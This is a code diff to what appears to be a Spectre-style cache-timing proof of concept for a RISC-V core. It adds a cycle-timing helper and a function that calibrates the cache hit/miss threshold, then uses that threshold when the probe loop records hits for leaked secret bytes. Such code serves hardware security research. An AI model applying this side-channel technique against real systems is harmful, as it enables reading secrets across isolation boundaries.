@@ -3,6 +3,40 @@
 #include "encoding.h"
 #include "cache.h"
 
+static inline uint64_t measure_cycles(volatile uint8_t *addr){
+    uint64_t t1 = rdcycle();
+    volatile uint8_t v = *addr; (void)v;
+    return rdcycle() - t1;
+}
+
+static uint64_t calibrate_threshold(uint8_t *probe_base){
+    // Crude calibration: take min of several warmed hits and avg of cold misses
+    const int iters = 64;
+    uint64_t hit_min = (uint64_t)-1, miss_avg = 0;
+    // Warm one line
+    volatile uint8_t *warm = probe_base;
+    for(int i=0;i<32;i++){ volatile uint8_t x = *warm; (void)x; }
+    for(int i=0;i<iters;i++){
+        uint64_t c = measure_cycles((volatile uint8_t*)warm);
+        if(c < hit_min) hit_min = c;
+    }
+    // Choose a far line likely mapping to different set; here +4096*8 as heuristic
+    volatile uint8_t *cold = probe_base + 4096*8;
+    // Try to evict by touching a large range; fallback to flushCache if available macro
+    for(int r=0;r<128;r++){ volatile uint8_t x = probe_base[(r*64)%(256*64)]; (void)x; }
+    for(int i=0;i<iters;i++){
+        // Try to keep it cold by simple dummy sweep
+        for(int r=0;r<128;r++){ volatile uint8_t x = probe_base[(r*64)%(256*64)]; (void)x; }
+        uint64_t c = measure_cycles((volatile uint8_t*)cold);
+        miss_avg += c;
+    }
+    miss_avg /= iters;
+    uint64_t thr = (hit_min*3 + miss_avg*1)/4; // skew toward miss
+    if(thr < hit_min+2) thr = hit_min+2;
+    return thr;
+}
+
+
 #define NUM_TRAINING 6          // Training iterations related to branch predictor state
 #define NUM_ROUNDS 1            // Outer rounds (not really used in inner loop logic)
 #define SAME_INDEX_ROUNDS 10    // Repetitions for attacking the same secret index for reliability
@@ -70,6 +104,8 @@ int main(void) {
     uint64_t passInIndex, randomIndex; // Index argument for JALR target; non-secret index for training
     uint8_t dummy = 0;            // Dummy variable for cache read
     static uint64_t results[256]; // Cache hit results
+
+    uint64_t g_threshold = calibrate_threshold(array2);
 
     printf("Starting the loop...\n");
 
@@ -147,7 +183,7 @@ int main(void) {
                 elapsedTime = (rdcycle() - startTime);
 
                 // Record cache hit if access time is below threshold
-                if (elapsedTime < CACHE_THRESHOLD) {
+                if (elapsedTime < g_threshold) {
                     results[m] += 1;
                 }
             }
